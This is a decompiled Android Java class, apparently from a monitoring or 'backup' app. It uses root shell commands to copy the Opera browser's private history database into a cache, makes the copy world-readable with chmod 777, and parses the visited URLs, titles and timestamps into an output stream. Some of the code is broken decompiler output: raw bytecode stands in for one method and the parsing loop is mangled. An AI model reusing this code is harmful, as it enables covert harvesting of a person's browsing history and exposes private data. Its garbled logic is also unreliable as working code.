package ru.dtlbox.databasereader;

import android.database.sqlite.SQLiteException;
import android.util.Log;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class OperaHistoryReader
  extends BaseBrowserHistoryReader
{
  private static final byte BROWSERHISTORY = 114;
  private static final String FILE_DATA = "all";
  private static final String PATH_TO_DATA = "/data/data/com.opera.browser/files/ds/4/";
  private static final String TAG = "backup.service";
  private static final String USING_FILE = "opera_history";
  public int EMPTY_ID = 0;
  Config config;
  
  public OperaHistoryReader(Config paramConfig)
  {
    Log.v("backup.service", "OHR:OperaHistoryReader");
    this.config = paramConfig;
    if (!checkFile()) {
      update();
    }
  }
  
  private boolean checkFile()
  {
    Log.v("backup.service", "OHR:checkFile");
    try
    {
      boolean bool = new File(this.config.getCachePath() + "opera_history").exists();
      return bool;
    }
    catch (SQLiteException localSQLiteException)
    {
      System.out.println("File doesn't exist");
    }
    return false;
  }
  
  private static int intFromBytes(byte[] paramArrayOfByte)
  {
    return paramArrayOfByte[0] << 24 | (paramArrayOfByte[1] & 0xFF) << 16 | (paramArrayOfByte[2] & 0xFF) << 8 | paramArrayOfByte[3] & 0xFF;
  }
  
  private static List<OperaHistoryRecord> readBinary(byte[] paramArrayOfByte)
    throws IOException
  {
    Log.v("backup.service", "OHR:readBinary");
    ArrayList localArrayList = new ArrayList();
    byte[] arrayOfByte = new byte[8];
    Object localObject = new byte[3];
    paramArrayOfByte = new ByteArrayInputStream(paramArrayOfByte);
    paramArrayOfByte.read((byte[])localObject);
    localObject = new OperaHistoryRecord(null);
    int i = paramArrayOfByte.read();
    if (i == -1) {
      return localArrayList;
    }
    int j = ByteWorking.intFromTwoBytes((byte)i, (byte)paramArrayOfByte.read());
    if (j != 0) {}
    for (i = 1;; i = 0)
    {
      ((OperaHistoryRecord)localObject).url = readString(paramArrayOfByte, j);
      if (i != 0) {
        ((OperaHistoryRecord)localObject).host = readString(paramArrayOfByte, 0);
      }
      ((OperaHistoryRecord)localObject).title = readString(paramArrayOfByte, 0);
      ((OperaHistoryRecord)localObject).timestamp = (readInt(paramArrayOfByte) * 1000L);
      localArrayList.add(localObject);
      if (paramArrayOfByte.read(arrayOfByte) > 0) {
        break;
      }
      return localArrayList;
    }
  }
  
  /* Error */
  private static byte[] readFileAsByteArray(File paramFile)
    throws IOException
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore 4
    //   3: aconst_null
    //   4: astore_3
    //   5: sipush 4096
    //   8: newarray byte
    //   10: astore 5
    //   12: new 166	java/io/ByteArrayOutputStream
    //   15: dup
    //   16: invokespecial 167	java/io/ByteArrayOutputStream:<init>	()V
    //   19: astore_2
    //   20: new 169	java/io/FileInputStream
    //   23: dup
    //   24: aload_0
    //   25: invokespecial 172	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   28: astore_0
    //   29: aload_0
    //   30: aload 5
    //   32: invokevirtual 175	java/io/InputStream:read	([B)I
    //   35: istore_1
    //   36: iload_1
    //   37: iconst_m1
    //   38: if_icmpne +24 -> 62
    //   41: aload_2
    //   42: ifnull +7 -> 49
    //   45: aload_2
    //   46: invokevirtual 178	java/io/ByteArrayOutputStream:close	()V
    //   49: aload_0
    //   50: ifnull +7 -> 57
    //   53: aload_0
    //   54: invokevirtual 179	java/io/InputStream:close	()V
    //   57: aload_2
    //   58: invokevirtual 183	java/io/ByteArrayOutputStream:toByteArray	()[B
    //   61: areturn
    //   62: aload_2
    //   63: aload 5
    //   65: iconst_0
    //   66: iload_1
    //   67: invokevirtual 187	java/io/ByteArrayOutputStream:write	([BII)V
    //   70: goto -41 -> 29
    //   73: astore 4
    //   75: aload_0
    //   76: astore_3
    //   77: aload 4
    //   79: astore_0
    //   80: aload_2
    //   81: ifnull +7 -> 88
    //   84: aload_2
    //   85: invokevirtual 178	java/io/ByteArrayOutputStream:close	()V
    //   88: aload_3
    //   89: ifnull +7 -> 96
    //   92: aload_3
    //   93: invokevirtual 179	java/io/InputStream:close	()V
    //   96: aload_0
    //   97: athrow
    //   98: astore_2
    //   99: goto -11 -> 88
    //   102: astore_2
    //   103: goto -7 -> 96
    //   106: astore_3
    //   107: goto -58 -> 49
    //   110: astore_0
    //   111: goto -54 -> 57
    //   114: astore_0
    //   115: aload 4
    //   117: astore_2
    //   118: goto -38 -> 80
    //   121: astore_0
    //   122: goto -42 -> 80
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	125	0	paramFile	File
    //   35	32	1	i	int
    //   19	66	2	localByteArrayOutputStream	java.io.ByteArrayOutputStream
    //   98	1	2	localIOException1	IOException
    //   102	1	2	localIOException2	IOException
    //   117	1	2	localObject1	Object
    //   4	89	3	localFile	File
    //   106	1	3	localIOException3	IOException
    //   1	1	4	localObject2	Object
    //   73	43	4	localObject3	Object
    //   10	54	5	arrayOfByte	byte[]
    // Exception table:
    //   from	to	target	type
    //   29	36	73	finally
    //   62	70	73	finally
    //   84	88	98	java/io/IOException
    //   92	96	102	java/io/IOException
    //   45	49	106	java/io/IOException
    //   53	57	110	java/io/IOException
    //   5	20	114	finally
    //   20	29	121	finally
  }
  
  private static int readInt(ByteArrayInputStream paramByteArrayInputStream)
    throws IOException
  {
    byte[] arrayOfByte = new byte[4];
    paramByteArrayInputStream.read(arrayOfByte);
    return intFromBytes(arrayOfByte);
  }
  
  private static String readString(ByteArrayInputStream paramByteArrayInputStream, int paramInt)
    throws IOException
  {
    int i = paramInt;
    if (paramInt == 0) {
      i = ByteWorking.intFromTwoBytes((byte)paramByteArrayInputStream.read(), (byte)paramByteArrayInputStream.read());
    }
    byte[] arrayOfByte = new byte[i];
    paramByteArrayInputStream.read(arrayOfByte);
    return new String(arrayOfByte);
  }
  
  private void runCopyFilesRootAccess(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    Log.v("backup.service", "OHR:runCopyFilesRootAccess");
    String str = "chmod 777 " + paramString3 + paramString4;
    RootCommand.commandSU(new StringBuilder("cat '").append(paramString1).append(paramString2).append("' > '").append(paramString3).append(paramString4).append("'").toString() + " && " + str);
  }
  
  public void logIt()
  {
    Object localObject = new File(this.config.getCachePath() + "opera_history");
    try
    {
      localObject = readBinary(readFileAsByteArray((File)localObject)).iterator();
      for (;;)
      {
        if (!((Iterator)localObject).hasNext()) {
          return;
        }
        OperaHistoryRecord localOperaHistoryRecord = (OperaHistoryRecord)((Iterator)localObject).next();
        Log.d("backup.service", "OHR1:" + localOperaHistoryRecord.toString());
      }
      return;
    }
    catch (IOException localIOException)
    {
      localIOException.printStackTrace();
    }
  }
  
  @Deprecated
  public int read(OutputStream paramOutputStream, int paramInt)
    throws IOException
  {
    return 0;
  }
  
  public long readHistory(OutputStream paramOutputStream, long paramLong)
  {
    Log.v("backup.service", "OHR:readHistory");
    long l = System.currentTimeMillis() / 1000L;
    Object localObject = new File(this.config.getCachePath() + "opera_history");
    int i = 1;
    try
    {
      localObject = readBinary(readFileAsByteArray((File)localObject));
      Log.v("backup.service", "OHR:readHistory.size " + ((List)localObject).size());
      if (((List)localObject).size() == 0) {
        return 0L;
      }
      paramOutputStream.write(114);
      localObject = ((List)localObject).iterator();
      for (;;)
      {
        if (!((Iterator)localObject).hasNext())
        {
          paramOutputStream.write(2);
          paramLong = l;
          if (i == 0) {
            break;
          }
          return 0L;
        }
        OperaHistoryRecord localOperaHistoryRecord = (OperaHistoryRecord)((Iterator)localObject).next();
        if (localOperaHistoryRecord.timestamp / 1000L > paramLong)
        {
          i = 0;
          addData(paramOutputStream, String.valueOf(localOperaHistoryRecord.timestamp / 1000L));
          addData(paramOutputStream, localOperaHistoryRecord.title);
          addData(paramOutputStream, localOperaHistoryRecord.url);
          paramOutputStream.write(3);
        }
      }
      return paramLong;
    }
    catch (IOException paramOutputStream) {}
  }
  
  public boolean update()
  {
    try
    {
      runCopyFilesRootAccess("/data/data/com.opera.browser/files/ds/4/", "all", this.config.getCachePath(), "opera_history");
      return true;
    }
    catch (Exception localException) {}
    return false;
  }
  
  private static class OperaHistoryRecord
  {
    String host;
    long timestamp;
    String title;
    String url;
    
    private OperaHistoryRecord() {}
    
    public String toString()
    {
      return this.title + " | " + this.url + " | " + this.host + " | " + this.timestamp;
    }
  }
}
